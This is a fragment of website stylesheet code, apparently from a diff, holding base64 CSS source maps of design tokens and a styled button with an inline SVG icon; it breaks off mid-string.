S0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gKi9cblxuICAtLXRleHQtc3R5bGUtY2FtcGFpZ24tbGFyZ2UtZmFtaWx5OiB2YXIoLS1mb250LWZhbWlseS13aWRlKTtcbiAgLS10ZXh0LXN0eWxlLWNhbXBhaWduLWxhcmdlLXNpemU6IHZhcigtLWZvbnQtc2l6ZS05eCk7XG4gIC0tdGV4dC1zdHlsZS1jYW1wYWlnbi1sYXJnZS1zcGFjaW5nOiB2YXIoLS1mb250LXNwYWNpbmctbm9ybWFsKTtcbiAgLS10ZXh0LXN0eWxlLWNhbXBhaWduLWxhcmdlLXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtYnVsa3kpO1xuICAtLXRleHQtc3R5bGUtY2FtcGFpZ24tbGFyZ2UtaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC10aWdodCk7XG5cbiAgLS10ZXh0LXN0eWxlLWNhbXBhaWduLXNtYWxsLWZhbWlseTogdmFyKC0tZm9udC1mYW1pbHktd2lkZSk7XG4gIC0tdGV4dC1zdHlsZS1jYW1wYWlnbi1zbWFsbC1zaXplOiB2YXIoLS1mb250LXNpemUtN3gpO1xuICAtLXRleHQtc3R5bGUtY2FtcGFpZ24tc21hbGwtc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS1jYW1wYWlnbi1zbWFsbC13ZWlnaHQ6IHZhcigtLWZvbnQtd2VpZ2h0LWJ1bGt5KTtcbiAgLS10ZXh0LXN0eWxlLWNhbXBhaWduLXNtYWxsLWhlaWdodDogdmFyKC0tZm9udC1oZWlnaHQtdGlnaHQpO1xuXG4gIC0tdGV4dC1zdHlsZS10aXRsZS0xLWZhbWlseTogdmFyKC0tZm9udC1mYW1pbHktcmVndWxhcik7XG4gIC0tdGV4dC1zdHlsZS10aXRsZS0xLXNpemU6IHZhcigtLWZvbnQtc2l6ZS04eCk7XG4gIC0tdGV4dC1zdHlsZS10aXRsZS0xLXNwYWNpbmc6IHZhcigtLWZvbnQtc3BhY2luZy1ub3JtYWwpO1xuICAtLXRleHQtc3R5bGUtdGl0bGUtMS13ZWlnaHQ6IHZhcigtLWZvbnQtd2VpZ2h0LWJ1bGt5KTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTEtaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC10aWdodCk7XG5cbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTItZmFtaWx5OiB2YXIoLS1mb250LWZhbWlseS1yZWd1bGFyKTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTItc2l6ZTogdmFyKC0tZm9udC1zaXplLTd4KTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTItc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS10aXRsZS0yLXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtbWVkaWFuKTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTItaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC10aWdodCk7XG5cbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTMtZmFtaWx5OiB2YXIoLS1mb250LWZhbWlseS1yZWd1bGFyKTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTMtc2l6ZTogdmFyKC0tZm9udC1zaXplLTZ4KTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTMtc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS10aXRsZS0zLXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtbWVkaWFuKTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTMtaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC10aWdodCk7XG5cbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTQtZmFtaWx5OiB2YXIoLS1mb250LWZhbWlseS1yZWd1bGFyKTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTQtc2l6ZTogdmFyKC0tZm9udC1zaXplLTV4KTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTQtc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS10aXRsZS00LXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtbWVkaWFuKTtcbiAgLS10ZXh0LXN0eWxlLXRpdGxlLTQtaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC10aWdodCk7XG5cbiAgLS10ZXh0LXN0eWxlLXN1YmhlYWRpbmctZmFtaWx5OiB2YXIoLS1mb250LWZhbWlseS1yZWd1bGFyKTtcbiAgLS10ZXh0LXN0eWxlLXN1YmhlYWRpbmctc2l6ZTogdmFyKC0tZm9udC1zaXplLTR4KTtcbiAgLS10ZXh0LXN0eWxlLXN1YmhlYWRpbmctc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS1zdWJoZWFkaW5nLXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtbWVkaWFuKTtcbiAgLS10ZXh0LXN0eWxlLXN1YmhlYWRpbmctaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC1ub3JtYWwpO1xuXG4gIC0tdGV4dC1zdHlsZS1ib2R5LWxhcmdlLWZhbWlseTogdmFyKC0tZm9udC1mYW1pbHktcmVndWxhcik7XG4gIC0tdGV4dC1zdHlsZS1ib2R5LWxhcmdlLXNpemU6IHZhcigtLWZvbnQtc2l6ZS0zeCk7XG4gIC0tdGV4dC1zdHlsZS1ib2R5LWxhcmdlLXNwYWNpbmc6IHZhcigtLWZvbnQtc3BhY2luZy1ub3JtYWwpO1xuICAtLXRleHQtc3R5bGUtYm9keS1sYXJnZS13ZWlnaHQ6IHZhcigtLWZvbnQtd2VpZ2h0LW5ldXRyYWwpO1xuICAtLXRleHQtc3R5bGUtYm9keS1sYXJnZS1oZWlnaHQ6IHZhcigtLWZvbnQtaGVpZ2h0LW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS1ib2R5LWxhcmdlLXN0cm9uZy13ZWlnaHQ6IHZhcigtLWZvbnQtd2VpZ2h0LWJ1bGt5KTtcblxuICAtLXRleHQtc3R5bGUtYm9keS1zbWFsbC1mYW1pbHk6IHZhcigtLWZvbnQtZmFtaWx5LXJlZ3VsYXIpO1xuICAtLXRleHQtc3R5bGUtYm9keS1zbWFsbC1zaXplOiB2YXIoLS1mb250LXNpemUtMngpO1xuICAtLXRleHQtc3R5bGUtYm9keS1zbWFsbC1zcGFjaW5nOiB2YXIoLS1mb250LXNwYWNpbmctbm9ybWFsKTtcbiAgLS10ZXh0LXN0eWxlLWJvZHktc21hbGwtd2VpZ2h0OiB2YXIoLS1mb250LXdlaWdodC1uZXV0cmFsKTtcbiAgLS10ZXh0LXN0eWxlLWJvZHktc21hbGwtaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC1ub3JtYWwpO1xuICAtLXRleHQtc3R5bGUtYm9keS1zbWFsbC1zdHJvbmctd2VpZ2h0OiB2YXIoLS1mb250LXdlaWdodC1idWxreSk7XG5cbiAgLS10ZXh0LXN0eWxlLWxhYmVsLWxhcmdlLWZhbWlseTogdmFyKC0tZm9udC1mYW1pbHktcmVndWxhcik7XG4gIC0tdGV4dC1zdHlsZS1sYWJlbC1sYXJnZS1zaXplOiB2YXIoLS1mb250LXNpemUtM3gpO1xuICAtLXRleHQtc3R5bGUtbGFiZWwtbGFyZ2Utc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLW5vcm1hbCk7XG4gIC0tdGV4dC1zdHlsZS1sYWJlbC1sYXJnZS13ZWlnaHQ6IHZhcigtLWZvbnQtd2VpZ2h0LW1lZGlhbik7XG4gIC0tdGV4dC1zdHlsZS1sYWJlbC1sYXJnZS1oZWlnaHQ6IHZhcigtLWZvbnQtaGVpZ2h0LW5vcm1hbCk7XG5cbiAgLS10ZXh0LXN0eWxlLWxhYmVsLXNtYWxsLWZhbWlseTogdmFyKC0tZm9udC1mYW1pbHktcmVndWxhcik7XG4gIC0tdGV4dC1zdHlsZS1sYWJlbC1zbWFsbC1zaXplOiB2YXIoLS1mb250LXNpemUtMngpO1xuICAtLXRleHQtc3R5bGUtbGFiZWwtc21hbGwtc3BhY2luZzogdmFyKC0tZm9udC1zcGFjaW5nLWxvb3NlKTtcbiAgLS10ZXh0LXN0eWxlLWxhYmVsLXNtYWxsLXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtbWVkaWFuKTtcbiAgLS10ZXh0LXN0eWxlLWxhYmVsLXNtYWxsLWhlaWdodDogdmFyKC0tZm9udC1oZWlnaHQtbm9ybWFsKTtcblxuICAtLXRleHQtc3R5bGUtbWljcm8tZmFtaWx5OiB2YXIoLS1mb250LWZhbWlseS1yZWd1bGFyKTtcbiAgLS10ZXh0LXN0eWxlLW1pY3JvLXNpemU6IHZhcigtLWZvbnQtc2l6ZS0xeCk7XG4gIC0tdGV4dC1zdHlsZS1taWNyby1zcGFjaW5nOiB2YXIoLS1mb250LXNwYWNpbmctbG9vc2UpO1xuICAtLXRleHQtc3R5bGUtbWljcm8td2VpZ2h0OiB2YXIoLS1mb250LXdlaWdodC1uZXV0cmFsKTtcbiAgLS10ZXh0LXN0eWxlLW1pY3JvLWhlaWdodDogdmFyKC0tZm9udC1oZWlnaHQtdGlnaHQpO1xufVxuXG4uY29sb3Itc2NoZW1lLWxpZ2h0IHtcbiAgLS1jb2xvci1pbnRlcmFjdGl2ZS1wcmltYXJ5OiB2YXIoLS1jb2xvci1ncmVlbi0xMDApO1xuICAtLWNvbG9yLWludGVyYWN0aXZlLXByaW1hcnktaG92ZXI6IHZhcigtLWNvbG9yLWdyZWVuLTMwMCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtc2Vjb25kYXJ5OiB2YXIoLS1jb2xvci10cmFuc3BhcmVudCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtc2Vjb25kYXJ5LWhvdmVyOiB2YXIoLS1jb2xvci1ncmV5LTEwMDApO1xuICAtLWNvbG9yLWludGVyYWN0aXZlLXRlcnRpYXJ5OiB2YXIoLS1jb2xvci10cmFuc3BhcmVudCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtdGVydGlhcnktaG92ZXI6IHZhcigtLWNvbG9yLWdyZXktMjUpO1xuICAtLWNvbG9yLWludGVyYWN0aXZlLWNvbnRyb2w6IHZhcigtLWNvbG9yLWdyZXktMTAwMCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtY29udHJvbC1ob3ZlcjogdmFyKC0tY29sb3ItZ3JleS03MDApO1xuICAtLWNvbG9yLWludGVyYWN0aXZlLWRpc2FibGVkOiB2YXIoLS1jb2xvci1ncmV5LTEwMCk7XG5cbiAgLS1jb2xvci1zdXJmYWNlLXByaW1hcnk6IHZhcigtLWNvbG9yLXdoaXRlKTtcbiAgLS1jb2xvci1zdXJmYWNlLWFjY2VudDogdmFyKC0tY29sb3ItZ3JleS01MCk7XG4gIC0tY29sb3Itc3VyZmFjZS1pbnZlcnNlOiB2YXIoLS1jb2xvci1ncmV5LTEwMDApO1xuICAtLWNvbG9yLXN1cmZhY2UtYnJhbmQtYWNjZW50OiB2YXIoLS1jb2xvci1qYWZmYS0yNSk7XG4gIC0tY29sb3Itc3VyZmFjZS1lbGV2YXRlZDogdmFyKC0tY29sb3ItZ3JleS03MDApO1xuICAtLWNvbG9yLXN1cmZhY2UtY2F1dGlvbi1kZWZhdWx0OiB2YXIoLS1jb2xvci1qYWZmYS0yNSk7XG4gIC0tY29sb3Itc3VyZmFjZS1jYXV0aW9uLXN0cm9uZzogdmFyKC0tY29sb3ItamFmZmEtNzAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLWNyaXRpY2FsLWRlZmF1bHQ6IHZhcigtLWNvbG9yLXZlcnliZXJyeS0yNSk7XG4gIC0tY29sb3Itc3VyZmFjZS1jcml0aWNhbC1zdHJvbmc6IHZhcigtLWNvbG9yLXZlcnliZXJyeS03MDApO1xuICAtLWNvbG9yLXN1cmZhY2UtaW5mby1kZWZhdWx0OiB2YXIoLS1jb2xvci1ibHVlLTI1KTtcbiAgLS1jb2xvci1zdXJmYWNlLWluZm8tc3Ryb25nOiB2YXIoLS1jb2xvci1ibHVlLTcwMCk7XG4gIC0tY29sb3Itc3VyZmFjZS1uZXV0cmFsLWRlZmF1bHQ6IHZhcigtLWNvbG9yLWdyZXktMjUpO1xuICAtLWNvbG9yLXN1cmZhY2UtbmV1dHJhbC1zdHJvbmc6IHZhcigtLWNvbG9yLWdyZXktMTAwMCk7XG4gIC0tY29sb3Itc3VyZmFjZS1wb3NpdGl2ZS1kZWZhdWx0OiB2YXIoLS1jb2xvci1ncmVlbi0yNSk7XG4gIC0tY29sb3Itc3VyZmFjZS1wb3NpdGl2ZS1zdHJvbmc6IHZhcigtLWNvbG9yLWdyZWVuLTcwMCk7XG5cbiAgLS1jb2xvci1vdmVybGF5LWxpZ2h0OiB2YXIoLS1jb2xvci13aGl0ZS1tYXNrKTtcbiAgLS1jb2xvci1vdmVybGF5LWRhcms6IHZhcigtLWNvbG9yLWdyZXktMTAwMC1tYXNrKTtcblxuICAtLWNvbG9yLWNvbnRlbnQtYnJhbmQ6IHZhcigtLWNvbG9yLWdyZWVuLTEwMDApO1xuICAtLWNvbG9yLWNvbnRlbnQtYnJhbmQtYWNjZW50OiB2YXIoLS1jb2xvci1idWJibGVndW0tNzAwKTtcbiAgLS1jb2xvci1jb250ZW50LXByaW1hcnk6IHZhcigtLWNvbG9yLWdyZXktMTAwMCk7XG4gIC0tY29sb3ItY29udGVudC1pbnZlcnNlOiB2YXIoLS1jb2xvci13aGl0ZSk7XG4gIC0tY29sb3ItY29udGVudC1zZWNvbmRhcnk6IHZhcigtLWNvbG9yLWdyZXktNTAwKTtcbiAgLS1jb2xvci1jb250ZW50LWRpc2FibGVkOiB2YXIoLS1jb2xvci1ncmV5LTMwMCk7XG4gIC0tY29sb3ItY29udGVudC1jYXV0aW9uLWRlZmF1bHQ6IHZhcigtLWNvbG9yLWphZmZhLTcwMCk7XG4gIC0tY29sb3ItY29udGVudC1jYXV0aW9uLXN0cm9uZzogdmFyKC0tY29sb3ItamFmZmEtMjUpO1xuICAtLWNvbG9yLWNvbnRlbnQtY3JpdGljYWwtZGVmYXVsdDogdmFyKC0tY29sb3ItdmVyeWJlcnJ5LTcwMCk7XG4gIC0tY29sb3ItY29udGVudC1jcml0aWNhbC1zdHJvbmc6IHZhcigtLWNvbG9yLXZlcnliZXJyeS0yNSk7XG4gIC0tY29sb3ItY29udGVudC1pbmZvLWRlZmF1bHQ6IHZhcigtLWNvbG9yLWJsdWUtNzAwKTtcbiAgLS1jb2xvci1jb250ZW50LWluZm8tc3Ryb25nOiB2YXIoLS1jb2xvci1ibHVlLTI1KTtcbiAgLS1jb2xvci1jb250ZW50LW5ldXRyYWwtZGVmYXVsdDogdmFyKC0tY29sb3ItZ3JleS0xMDAwKTtcbiAgLS1jb2xvci1jb250ZW50LW5ldXRyYWwtc3Ryb25nOiB2YXIoLS1jb2xvci13aGl0ZSk7XG4gIC0tY29sb3ItY29udGVudC1wb3NpdGl2ZS1kZWZhdWx0OiB2YXIoLS1jb2xvci1ncmVlbi03MDApO1xuICAtLWNvbG9yLWNvbnRlbnQtcG9zaXRpdmUtc3Ryb25nOiB2YXIoLS1jb2xvci1ncmVlbi0yNSk7XG5cbiAgLS1jb2xvci1ib3JkZXItcHJpbWFyeTogdmFyKC0tY29sb3ItZ3JleS0xMDAwKTtcbiAgLS1jb2xvci1ib3JkZXItc2Vjb25kYXJ5OiB2YXIoLS1jb2xvci1ncmV5LTMwMCk7XG4gIC0tY29sb3ItYm9yZGVyLXRlcnRpYXJ5OiB2YXIoLS1jb2xvci1ncmV5LTEwMCk7XG5cbiAgLS1jb2xvci1hbHdheXMtd2hpdGU6IHZhcigtLWNvbG9yLXdoaXRlKTtcbn1cblxuLmNvbG9yLXNjaGVtZS1kYXJrIHtcbiAgLS1jb2xvci1pbnRlcmFjdGl2ZS1wcmltYXJ5OiB2YXIoLS1jb2xvci1ncmVlbi0xMDApO1xuICAtLWNvbG9yLWludGVyYWN0aXZlLXByaW1hcnktaG92ZXI6IHZhcigtLWNvbG9yLWdyZWVuLTMwMCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtc2Vjb25kYXJ5OiB2YXIoLS1jb2xvci10cmFuc3BhcmVudCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtc2Vjb25kYXJ5LWhvdmVyOiB2YXIoLS1jb2xvci13aGl0ZSk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtdGVydGlhcnk6IHZhcigtLWNvbG9yLXRyYW5zcGFyZW50KTtcbiAgLS1jb2xvci1pbnRlcmFjdGl2ZS10ZXJ0aWFyeS1ob3ZlcjogdmFyKC0tY29sb3ItZ3JleS03MDApO1xuICAtLWNvbG9yLWludGVyYWN0aXZlLWNvbnRyb2w6IHZhcigtLWNvbG9yLXdoaXRlKTtcbiAgLS1jb2xvci1pbnRlcmFjdGl2ZS1jb250cm9sLWhvdmVyOiB2YXIoLS1jb2xvci1ncmV5LTEwMCk7XG4gIC0tY29sb3ItaW50ZXJhY3RpdmUtZGlzYWJsZWQ6IHZhcigtLWNvbG9yLWdyZXktNzAwKTtcblxuICAtLWNvbG9yLXN1cmZhY2UtcHJpbWFyeTogdmFyKC0tY29sb3ItZ3JleS0xMDAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLWFjY2VudDogdmFyKC0tY29sb3ItZ3JleS03MDApO1xuICAtLWNvbG9yLXN1cmZhY2UtaW52ZXJzZTogdmFyKC0tY29sb3Itd2hpdGUpO1xuICAtLWNvbG9yLXN1cmZhY2UtYnJhbmQtYWNjZW50OiB2YXIoLS1jb2xvci1ncmV5LTcwMCk7XG4gIC0tY29sb3Itc3VyZmFjZS1lbGV2YXRlZDogdmFyKC0tY29sb3ItZ3JleS03MDApO1xuICAtLWNvbG9yLXN1cmZhY2UtY2F1dGlvbi1kZWZhdWx0OiB2YXIoLS1jb2xvci1qYWZmYS0xMDAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLWNhdXRpb24tc3Ryb25nOiB2YXIoLS1jb2xvci1qYWZmYS01MDApO1xuICAtLWNvbG9yLXN1cmZhY2UtY3JpdGljYWwtZGVmYXVsdDogdmFyKC0tY29sb3ItdmVyeWJlcnJ5LTEwMDApO1xuICAtLWNvbG9yLXN1cmZhY2UtY3JpdGljYWwtc3Ryb25nOiB2YXIoLS1jb2xvci12ZXJ5YmVycnktNTAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLWluZm8tZGVmYXVsdDogdmFyKC0tY29sb3ItYmx1ZS0xMDAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLWluZm8tc3Ryb25nOiB2YXIoLS1jb2xvci1ibHVlLTUwMCk7XG4gIC0tY29sb3Itc3VyZmFjZS1uZXV0cmFsLWRlZmF1bHQ6IHZhcigtLWNvbG9yLWdyZXktNzAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLW5ldXRyYWwtc3Ryb25nOiB2YXIoLS1jb2xvci13aGl0ZSk7XG4gIC0tY29sb3Itc3VyZmFjZS1wb3NpdGl2ZS1kZWZhdWx0OiB2YXIoLS1jb2xvci1ncmVlbi0xMDAwKTtcbiAgLS1jb2xvci1zdXJmYWNlLXBvc2l0aXZlLXN0cm9uZzogdmFyKC0tY29sb3ItZ3JlZW4tNTAwKTtcblxuICAtLWNvbG9yLW92ZXJsYXktbGlnaHQ6IHZhcigtLWNvbG9yLXdoaXRlLW1hc2spO1xuICAtLWNvbG9yLW92ZXJsYXktZGFyazogdmFyKC0tY29sb3ItZ3JleS0xMDAwLW1hc2spO1xuXG4gIC0tY29sb3ItY29udGVudC1icmFuZDogdmFyKC0tY29sb3ItZ3JlZW4tMTAwMCk7XG4gIC0tY29sb3ItY29udGVudC1icmFuZC1hY2NlbnQ6IHZhcigtLWNvbG9yLWJ1YmJsZWd1bS0xMDApO1xuICAtLWNvbG9yLWNvbnRlbnQtcHJpbWFyeTogdmFyKC0tY29sb3Itd2hpdGUpO1xuICAtLWNvbG9yLWNvbnRlbnQtaW52ZXJzZTogdmFyKC0tY29sb3ItZ3JleS0xMDAwKTtcbiAgLS1jb2xvci1jb250ZW50LXNlY29uZGFyeTogdmFyKC0tY29sb3ItZ3JleS0xMDApO1xuICAtLWNvbG9yLWNvbnRlbnQtZGlzYWJsZWQ6IHZhcigtLWNvbG9yLWdyZXktNTAwKTtcbiAgLS1jb2xvci1jb250ZW50LWNhdXRpb24tZGVmYXVsdDogdmFyKC0tY29sb3ItamFmZmEtNTAwKTtcbiAgLS1jb2xvci1jb250ZW50LWNhdXRpb24tc3Ryb25nOiB2YXIoLS1jb2xvci1qYWZmYS0xMDAwKTtcbiAgLS1jb2xvci1jb250ZW50LWNyaXRpY2FsLWRlZmF1bHQ6IHZhcigtLWNvbG9yLXZlcnliZXJyeS01MDApO1xuICAtLWNvbG9yLWNvbnRlbnQtY3JpdGljYWwtc3Ryb25nOiB2YXIoLS1jb2xvci12ZXJ5YmVycnktMTAwMCk7XG4gIC0tY29sb3ItY29udGVudC1pbmZvLWRlZmF1bHQ6IHZhcigtLWNvbG9yLWJsdWUtNTAwKTtcbiAgLS1jb2xvci1jb250ZW50LWluZm8tc3Ryb25nOiB2YXIoLS1jb2xvci1ibHVlLTEwMDApO1xuICAtLWNvbG9yLWNvbnRlbnQtbmV1dHJhbC1kZWZhdWx0OiB2YXIoLS1jb2xvci13aGl0ZSk7XG4gIC0tY29sb3ItY29udGVudC1uZXV0cmFsLXN0cm9uZzogdmFyKC0tY29sb3ItZ3JleS0xMDAwKTtcbiAgLS1jb2xvci1jb250ZW50LXBvc2l0aXZlLWRlZmF1bHQ6IHZhcigtLWNvbG9yLWdyZWVuLTUwMCk7XG4gIC0tY29sb3ItY29udGVudC1wb3NpdGl2ZS1zdHJvbmc6IHZhcigtLWNvbG9yLWdyZWVuLTEwMDApO1xuXG4gIC0tY29sb3ItYm9yZGVyLXByaW1hcnk6IHZhcigtLWNvbG9yLXdoaXRlKTtcbiAgLS1jb2xvci1ib3JkZXItc2Vjb25kYXJ5OiB2YXIoLS1jb2xvci1ncmV5LTUwMCk7XG4gIC0tY29sb3ItYm9yZGVyLXRlcnRpYXJ5OiB2YXIoLS1jb2xvci1ncmV5LTcwMCk7XG5cbiAgLS1jb2xvci1hbHdheXMtd2hpdGU6IHZhcigtLWNvbG9yLXdoaXRlKTtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */
+    </style>
+    <style>
+        .brand-neue-button {
+            gap: var(--spacing-2x);
+            border-radius: var(--roundness-subtle);
+            background: var(--color-interactive-primary);
+            color: var(--color-content-brand);
+            font-family: PolySans-Median;
+            font-size: var(--font-size-2x);
+            letter-spacing: 0.02em;
+            text-align: center;
+            padding: 0 20px;
+        }
+        
+        .brand-neue-button:hover,
+        .brand-neue-button:active,
+        .brand-neue-button:focus {
+            background: var(--color-interactive-primary-hover);
+        }
+        
+        .brand-neue-button__open-in-new::after {
+            font-size: 0;
+            margin-left: 5px;
+            vertical-align: sub;
+            content: url("data:image/svg+xml,<svg width=\"14\" height=\"14\" viewBox=\"0 0 20 20\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><g id=\"ico-/-24-/-actions-/-open_in_new\"><path id=\"Icon-color\" d=\"M17.5 12.0833V15.8333C17.5 16.7538 16.7538 17.5 15.8333 17.5H4.16667C3.24619 17.5 2.5 16.7538 2.5 15.8333V4.16667C2.5 3.24619 3.24619 2.5 4.16667 2.5H7.91667C8.14679 2.5 8.33333 2.68655 8.33333 2.91667V3.75C8.33333 3.98012 8.14679 4.16667 7.91667 4.16667H4.16667V15.8333H15.8333V12.0833C15.8333 11.8532 16.0199 11.6667 16.25 11.6667H17.0833C17.3135 11.6667 17.5 11.8532 17.5 12.0833ZM17.3167 2.91667L17.0917 2.69167C16.98 2.57535 16.8278 2.50668 16.6667 2.5H11.25C11.0199 2.5 10.8333 2.68655 10.8333 2.91667V3.75C10.8333 3.98012 11.0199 4.16667 11.25 4.16667H14.6583L7.625 11.2C7.54612 11.2782 7.50175 11.3847 7.50175 11.4958C7.50175 11.6069 7.54612 11.7134 7.625 11.7917L8.20833 12.375C8.28657 12.4539 8.39307 12.4982 8.50417 12.4982C8.61527 12.4982 8.72176 12.4539 8.8 12.375L15.8333 5.35V8.75C15.8333 8.98012 16.0199 9.16667 16.25 9.16667H17.0833C17.3135 9.16667 17.5 8.98012 17.5 8.75V3.33333C17.4955 3.17342 17.4299 3.02132 17.3167 2.90833V2.91667Z\" fill=\"%231A4200\"/></g></svg>");
+        }
+        /*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9qYXZhc2NyaXB0L2NvbXBvbmVudHMvYnJhbmRfbmV1ZV90b2tlbnMvY29tcG9uZW50cy9idXR0b24uc2FzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLHNCQUFBO0VBQ0Esc0NBQUE7RUFDQSw0Q0FBQTtFQUNBLGlDQUFBO0VBQ0EsNEJBQUE7RUFDQSw4QkFBQTtFQUNBLHNCQUFBO0VBQ0Esa0JBQUE7RUFDQSxlQUFBO0FBQ0Y7QUFBRTtFQUNFLGtEQUFBO0FBRUo7O0FBQ0U7RUFDRSxZQUFBO0VBQ0EsZ0JBQUE7RUFDQSxtQkFBQTtFQUNBLGdEQUFBO0FBRUoiLCJzb3VyY2VzQ29udGVudCI6WyIuYnJhbmQtbmV1ZS1idXR0b25cbiAgZ2FwOiB2YXIoLS1zcGFjaW5nLTJ4KVxuICBib3JkZXItcmFkaXVzOiB2YXIoLS1yb3VuZG5lc3Mtc3VidGxlKVxuICBiYWNrZ3JvdW5kOiB2YXIoLS1jb2xvci1pbnRlcmFjdGl2ZS1wcmltYXJ5KVxuICBjb2xvcjogdmFyKC0tY29sb3ItY29udGVudC1icmFuZClcbiAgZm9udC1mYW1pbHk6IFBvbHlTYW5zLU1lZGlhblxuICBmb250LXNpemU6IHZhcigtLWZvbnQtc2l6ZS0yeClcbiAgbGV0dGVyLXNwYWNpbmc6IDAuMDJlbVxuICB0ZXh0LWFsaWduOiBjZW50ZXJcbiAgcGFkZGluZzogMCAyMHB4XG4gICY6aG92ZXIsICY6YWN0aXZlLCAmOmZvY3VzXG4gICAgYmFja2dyb3VuZDogdmFyKC0tY29sb3ItaW50ZXJhY3RpdmUtcHJpbWFyeS1ob3ZlcilcblxuLmJyYW5kLW5ldWUtYnV0dG9uX19vcGVuLWluLW5ld1xuICAmOjphZnRlclxuICAgIGZvbnQtc2l6ZTogMFxuICAgIG1hcmdpbi1sZWZ0OiA1cHhcbiAgICB2ZXJ0aWNhbC1hbGlnbjogc3ViXG4gICAgY29udGVudDogdXJsKCdkYXRhOmltYWdlL3N2Zyt4bWwsPHN2ZyB3aWR0aD1cIjE0XCIgaGVpZ2h0PVwiMTRcIiB2aWV3Qm94PVwiMCAwIDIwIDIwXCIgZmlsbD1cIm5vbmVcIiB4bWxucz1cImh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnXCI+PGcgaWQ9XCJpY28tLy0yNC0vLWFjdGlvbnMtLy1vcGVuX2luX25ld1wiPjxwYXRoIGlkPVwiSWNvbi1jb2xvclwiIGQ9XCJNMTcuNSAxMi4wODMzVjE1LjgzMzNDMTcuNSAxNi43NTM4IDE2Ljc1MzggMTcuNSAxNS44MzMzIDE3LjVINC4xNjY2N0MzLjI0NjE5IDE3LjUgMi41IDE2Ljc1MzggMi41IDE1LjgzMzNWNC4xNjY2N0MyLjUgMy4yNDYxOSAzLjI0NjE5IDIuNSA0LjE2NjY3IDIuNUg3LjkxNjY3QzguMTQ2NzkgMi41IDguMzMzMzMgMi42ODY1NSA4LjMzMzMzIDIuOTE2NjdWMy43NUM4LjMzMzMzIDMuOTgwMTIgOC4xNDY3OSA0LjE2NjY3IDcuOTE2NjcgNC4xNjY2N0g0LjE2NjY3VjE1LjgzMzNIMTUuODMzM1YxMi4wODMzQzE1LjgzMzMgMTEuODUzMiAxNi4wMTk5IDExLjY2NjcgMTYuMjUgMTEuNjY2N0gxNy4wODMzQzE3LjMxMzUgMTEuNjY2NyAxNy41IDExLjg1MzIgMTcuNSAxMi4wODMzWk0xNy4zMTY3IDIuOTE2NjdMMTcuMDkxNyAyLjY5MTY3QzE2Ljk4IDIuNTc1MzUgMTYuODI3OCAyLjUwNjY4IDE2LjY2NjcgMi41SDExLjI1QzExLjAxOTkgMi41IDEwLjgzMzMgMi42ODY1NSAxMC44MzMzIDIuOTE2NjdWMy43NUMxMC44MzMzIDMuOTgwMTIgMTEuMDE5OSA0LjE2NjY3IDExLjI1IDQuMTY2NjdIMTQuNjU4M0w3LjYyNSAxMS4yQzcuNTQ2MTIgMTEuMjc4MiA3LjUwMTc1IDExLjM4NDcgNy41MDE3NSAxMS40OTU4QzcuNTAxNzUgMTEuNjA2OSA3LjU0NjEyIDExLjcxMzQgNy42MjUgMTEuNzkxN0w4LjIwODMzIDEyLjM3NUM4LjI4NjU3IDEyLjQ1MzkgOC4zOTMwNyAxMi40OTgyIDguNTA0MTcgMTIuNDk4MkM4LjYxNTI3IDEyLjQ5ODIgOC43MjE3NiAxMi40NTM5IDguOCAxMi